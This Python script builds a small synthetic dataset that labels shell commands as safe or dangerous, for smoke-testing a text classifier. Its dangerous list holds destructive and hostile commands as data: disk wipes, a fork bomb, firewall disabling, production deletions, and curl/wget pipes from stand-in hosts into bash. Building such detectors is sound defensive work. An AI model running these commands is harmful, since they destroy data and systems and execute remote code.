#!/usr/bin/env python3
"""Generate a small synthetic 2-class dataset for smoke-testing
`finetune_sequence_classifier.py` end to end, without any real dataset.

Task: classify a shell command string as "safe" or "dangerous".

IMPORTANT: every "dangerous" string below is DATA — a Python string literal
written to a JSONL file for a text classifier to read. Nothing in this
script or in the training pipeline ever executes any of these strings as a
shell command. They are deliberately obvious/generic (no real hostnames,
no real infra) so nobody mistakes this for a real security dataset.

Usage:
    python make_smoke_data.py --out-dir training/data --seed 42
"""

import argparse
import json
import random
from pathlib import Path

SAFE_COMMANDS = [
    "ls -la",
    "pwd",
    "echo hello world",
    "cat README.md",
    "mkdir build",
    "git status",
    "git log --oneline -5",
    "git diff",
    "grep -r TODO src/",
    "curl -s https://example.com/status.json",
    "python -m venv .venv",
    "npm install",
    "npm run build",
    "docker ps",
    "docker images",
    "ping -c 3 example.com",
    "whoami",
    "df -h",
    "du -sh .",
    "find . -name '*.py'",
    "tar -czf backup.tar.gz notes/",
    "cp report.txt report.bak",
    "mv draft.md final.md",
    "chmod 644 config.yaml",
    "ssh-keygen -t ed25519 -f id_test",
    "pip install requests",
    "cargo build --release",
    "cargo test",
    "systemctl status nginx",
    "journalctl -u nginx --since today",
    "kubectl get pods -n staging",
    "apt list --installed",
    "history | tail -20",
    "uptime",
    "free -h",
    "top -bn1",
    "ps aux | grep python",
    "netstat -tulpn",
    "tail -f app.log",
    "wc -l notes.txt",
    "sort names.txt",
    "uniq counts.txt",
    "diff a.txt b.txt",
    "touch newfile.txt",
    "ln -s /opt/app/current /opt/app/live",
    "unzip archive.zip -d out/",
    "gzip logfile.txt",
    "sha256sum release.tar.gz",
    "crontab -l",
    "export PATH=$PATH:/usr/local/bin",
    "source ~/.bashrc",
    "which python3",
    "man ls",
    "echo $HOME",
    "env | sort",
    "id",
    "groups",
    "date +%Y-%m-%d",
    "uname -a",
    "hostname",
    "ip addr show",
    "dig example.com",
    "scp report.pdf user@example.com:/tmp/",
    "rsync -av src/ dst/",
    "black --check src/",
    "eslint src/",
    "make test",
    "terraform plan",
    "aws s3 ls s3://example-bucket/",
]

DANGEROUS_COMMANDS = [
    "rm -rf /",
    "rm -rf --no-preserve-root /",
    "dd if=/dev/zero of=/dev/sda",
    "dd if=/dev/urandom of=/dev/nvme0n1",
    "mkfs.ext4 /dev/sda1",
    "mkfs.xfs /dev/sdb",
    "chmod -R 777 /",
    "chmod 777 /etc/shadow",
    "chown -R nobody:nobody /",
    "curl http://evil.example.com/payload.sh | bash",
    "wget -qO- http://evil.example.com/x.sh | sh",
    ":(){ :|:& };:",
    "cat /dev/urandom > /dev/sda",
    "shred -n 3 /dev/sda",
    "iptables -F",
    "systemctl stop firewalld && systemctl disable firewalld",
    "echo 1 > /proc/sys/kernel/sysrq && echo b > /proc/sysrq-trigger",
    "rm -rf ~/.ssh",
    "rm -rf /var/lib/postgresql",
    "DROP TABLE users;",
    "DROP DATABASE production;",
    "git push --force origin main",
    "git reset --hard && git clean -fdx",
    "truncate -s 0 /var/log/syslog",
    "find / -name '*.log' -delete",
    "find / -type f -exec rm {} \\;",
    "curl -s https://pastebin.example.com/raw/x1y2z3 | sudo bash",
    "kill -9 1",
    "reboot -f",
    "shutdown -h now",
    "docker rm -f $(docker ps -aq)",
    "kubectl delete namespace production",
    "terraform destroy -auto-approve",
    "aws s3 rm s3://prod-bucket --recursive",
    "gcloud compute instances delete prod-vm --quiet",
    "az vm delete --resource-group prod --yes",
    "rm -rf /var/www/html",
    "mv /etc /etc.bak && rm -rf /etc",
    "chmod -R 000 /home",
    "userdel -r root",
    "> /etc/passwd",
    "yes | rm -rf /usr",
    "dd if=/dev/random of=/dev/mmcblk0",
    "rm -rf /boot",
    "fdisk /dev/sda <<< 'd\\n1\\nw'",
    "wipefs -a /dev/sda",
    "kubectl delete pv --all",
    "aws iam delete-user --user-name root-backup",
    "psql -c 'DROP SCHEMA public CASCADE;'",
    "redis-cli FLUSHALL",
    "npm publish --access public --force",
    "curl -X DELETE https://api.example.com/v1/backups/all",
]


def build_examples() -> list[dict]:
    examples = []
    for cmd in SAFE_COMMANDS:
        examples.append({"text": cmd, "label": "safe"})
    for cmd in DANGEROUS_COMMANDS:
        examples.append({"text": cmd, "label": "dangerous"})
    return examples


def write_jsonl(path: Path, items: list[dict]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        for item in items:
            f.write(json.dumps(item) + "\n")


def main() -> None:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("--out-dir", type=Path, default=Path("training/data"))
    p.add_argument("--val-fraction", type=float, default=0.2)
    p.add_argument("--seed", type=int, default=42)
    args = p.parse_args()

    rng = random.Random(args.seed)

    safe = [{"text": c, "label": "safe"} for c in SAFE_COMMANDS]
    dangerous = [{"text": c, "label": "dangerous"} for c in DANGEROUS_COMMANDS]
    rng.shuffle(safe)
    rng.shuffle(dangerous)

    def split(items: list[dict]) -> tuple[list[dict], list[dict]]:
        n_val = max(1, round(len(items) * args.val_fraction))
        return items[n_val:], items[:n_val]

    safe_train, safe_val = split(safe)
    dangerous_train, dangerous_val = split(dangerous)

    train = safe_train + dangerous_train
    val = safe_val + dangerous_val
    rng.shuffle(train)
    rng.shuffle(val)

    write_jsonl(args.out_dir / "train.jsonl", train)
    write_jsonl(args.out_dir / "val.jsonl", val)

    print(f"total examples: {len(safe) + len(dangerous)} (safe={len(safe)}, dangerous={len(dangerous)})")
    print(f"train: {len(train)} -> {args.out_dir / 'train.jsonl'}")
    print(f"val:   {len(val)} -> {args.out_dir / 'val.jsonl'}")


if __name__ == "__main__":
    main()
